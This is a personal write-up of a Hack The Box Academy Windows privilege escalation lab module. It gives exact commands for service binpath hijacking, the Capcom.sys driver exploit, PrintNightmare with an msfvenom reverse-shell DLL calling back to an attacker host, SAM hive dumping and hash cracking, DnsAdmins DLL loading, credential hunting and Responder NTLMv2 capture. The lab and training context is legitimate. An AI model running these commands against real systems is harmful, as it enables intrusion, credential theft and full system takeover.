# HTB Academy — Windows Privilege Escalation Module Completion

**Module:** [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)  
**Platform:** Hack The Box Academy  
**Author:** [6876h9](https://github.com/6876h9)  
**Status:** Completed

---

## Overview

This writeup documents my hands-on completion of the HTB Academy Windows Privilege Escalation module. It covers every lab section worked through on live targets, including the exact commands run, results observed, and the privilege escalation path taken in each case.

All labs were completed via RDP over HTB VPN using Pwnbox / Kali Linux as the attack host.

> **Note:** Flags are redacted in accordance with HTB rules. Hashes are partially redacted.

---

## Tools Used

- `accesschk.exe` (Sysinternals)
- `sc.exe`, `net.exe` (Windows built-ins)
- `msfvenom`, `msfconsole` (Metasploit Framework)
- `Responder` (SMB/LLMNR poisoning)
- `hashcat` (offline hash cracking)
- `dnscmd.exe` (DnsAdmins DLL injection)
- `secretsdump.py` (Impacket)
- `winPEAS` (automated enumeration)
- `PowerShell` (PSReadline history, DPAPI, StickyNotes)
- `xfreerdp` (RDP client)

---

## 1. Weak Service Permissions

**Target services:** `WindscribeService`, `SecurityService`  
**Escalation:** Low-privileged user → Local Administrator

Services running as `LocalSystem` with DACLs that grant write access to standard users allow direct binary path hijacking.

**Enumeration:**

```cmd
accesschk.exe /accepteula -uwcqv "htb-student" *
sc qc WindscribeService
```

`accesschk` confirmed `SERVICE_CHANGE_CONFIG` was accessible. The service was running as `LocalSystem`.

**Exploitation:**

```cmd
sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
net localgroup administrators
```

`htb-student` was added to the local Administrators group. Repeated for `SecurityService` with the same approach.

---

## 2. Server Operators Group Abuse

**Target service:** `AppReadiness`  
**Escalation:** Server Operators member → Local Administrator

The `Server Operators` built-in group can start, stop, and reconfigure services. Any service running as `LocalSystem` is a viable target.

**Enumeration:**

```cmd
whoami /groups
sc qc AppReadiness
accesschk.exe /accepteula -ucqv AppReadiness
```

Group membership confirmed. `AppReadiness` runs as `LocalSystem` with write access available.

**Exploitation:**

```cmd
sc config AppReadiness binpath= "cmd /c net localgroup administrators htb-student /add"
sc stop AppReadiness
sc start AppReadiness
net localgroup administrators
```

---

## 3. SeLoadDriverPrivilege — Capcom.sys

**Privilege abused:** `SeLoadDriverPrivilege`  
**Escalation:** Privileged user → SYSTEM via kernel driver

`SeLoadDriverPrivilege` permits loading kernel drivers. Capcom.sys is a legitimately signed but deliberately vulnerable driver that exposes a function executing arbitrary user-supplied shellcode in kernel context.

**Enumeration:**

```cmd
whoami /priv
```

`SeLoadDriverPrivilege` present in token.

**Exploitation:**

```cmd
EoPLoadDriver.exe System\CurrentControlSet\dfserv C:\tools\Capcom.sys
ExploitCapcom.exe
```

SYSTEM shell obtained.

---

## 4. PrintNightmare (CVE-2021-1675)

**CVE:** CVE-2021-1675 / CVE-2021-34527  
**Escalation:** Low-privileged domain user → SYSTEM

The Windows Print Spooler `RpcAddPrinterDriverEx()` function allowed standard users to install a printer driver DLL, which the Spooler loaded under `SYSTEM` context.

**Verification:**

```powershell
Get-Service -Name Spooler
```

Spooler running and unpatched.

**Attack host — generate DLL payload:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f dll -o shell.dll
python3 -m http.server
```

**Run the exploit:**

```bash
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\share\shell.dll'
```

Metasploit multi/handler caught the SYSTEM Meterpreter session.

---

## 5. HiveNightmare (CVE-2021-36934)

**CVE:** CVE-2021-36934  
**Escalation:** Standard user → credential extraction → Administrator

Overly permissive ACLs on `C:\Windows\System32\config\` allowed standard users to read the SAM, SYSTEM, and SECURITY hives directly, enabling offline hash extraction without elevation.

**Verification:**

```cmd
icacls C:\Windows\System32\config\SAM
```

Output showed `BUILTIN\Users:(I)(RX)` — readable by standard users.

**Extract hives:**

```cmd
reg.exe save hklm\sam C:\temp\sam.save
reg.exe save hklm\system C:\temp\system.save
reg.exe save hklm\security C:\temp\security.save
```

**Dump hashes (attack host):**

```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Crack NT hash:**

```bash
hashcat -m 1000 <NT_HASH> /usr/share/wordlists/rockyou.txt
```

Administrator credentials recovered.

---

## 6. DnsAdmins DLL Injection

**Group abused:** `DnsAdmins`  
**Escalation:** DnsAdmins member → SYSTEM via DNS service

Members of the `DnsAdmins` group can configure the DNS service to load an arbitrary DLL as a plugin. The DNS service runs as SYSTEM.

**Generate payload:**

```bash
msfvenom -p windows/x64/exec cmd='net localgroup administrators htb-student /add' -f dll -o adduser.dll
```

**Host on SMB share (attack host):**

```bash
smbserver.py share . -smb2support
```

**Configure DNS plugin (target):**

```cmd
dnscmd.exe /config /serverlevelplugindll \\<attacker_ip>\share\adduser.dll
```

**Restart the DNS service:**

```cmd
sc stop dns
sc start dns
```

DLL executed as SYSTEM. User added to local Administrators. Verified with `net localgroup administrators`.

RDP session disconnected and reconnected to refresh the token, confirming full admin access.

---

## 7. Credential Hunting

**Escalation:** Low-privileged user → credential recovery → lateral movement / privilege escalation

Credentials stored in plaintext or recoverable form across several locations on the target.

**PSReadline command history:**

```powershell
type C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Revealed previously run commands including plaintext passwords passed via `-Password` flags.

**StickyNotes SQLite database:**

```powershell
cd C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
```

Opened `plum.sqlite` and queried the `Note` table — password stored in a sticky note.

**web.config credential search:**

```powershell
findstr /si password C:\inetpub\wwwroot\web.config
```

**DPAPI PSCredential XML:**

```powershell
$cred = Import-Clixml C:\scripts\pass.xml
$cred.GetNetworkCredential().Password
```

Decrypted using the current user's DPAPI master key automatically.

**Event log credential search (Event ID 4688):**

```cmd
wevtutil qe Security /rd:true /f:text | findstr "user"
```

Credentials passed on the command line appeared in process creation logs.

---

## 8. SMB Hash Poisoning — Responder + NTLMv2 Cracking

**Escalation:** Network position → NTLMv2 capture → offline crack → credential access

When a Windows host attempts to resolve a name that does not exist in DNS, it falls back to LLMNR/NBT-NS broadcasts. Responder intercepts these and responds, causing the host to send an NTLMv2 authentication attempt.

**Start Responder on the attack interface:**

```bash
sudo responder -I tun0 -v
```

Waited for a network event (user or service attempting to connect to a non-existent share). Responder captured the NTLMv2 hash:

```
[SMB] NTLMv2 hash captured:
htb-student::<domain>:<challenge>:<response>
```

**Crack with hashcat (mode 5600 for NTLMv2):**

```bash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

Password recovered and used for lateral movement or privilege escalation depending on the account's group membership.

---

## 9. MS16-032 — Secondary Logon Handle Privilege Escalation

**MS Bulletin:** MS16-032  
**Target OS:** Windows 7 (unpatched)  
**Escalation:** Low-privileged user → SYSTEM

MS16-032 is a race condition vulnerability in the Windows Secondary Logon service (`seclogon`). An attacker can create a process with a duplicated handle to SYSTEM, then use it to spawn an elevated shell.

**Verify target is vulnerable:**

```powershell
Get-HotFix | findstr KB3143141
```

No output — patch not installed. Target is vulnerable.

**Run the exploit (PowerShell PoC):**

```powershell
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

SYSTEM shell spawned in a new window.

---

## Module Completed

All sections and lab exercises for the HTB Academy Windows Privilege Escalation module have been completed. The techniques covered span service misconfigurations, group privilege abuse, unpatched CVEs, credential recovery, and network-based hash capture — a representative cross-section of real-world Windows privilege escalation paths.
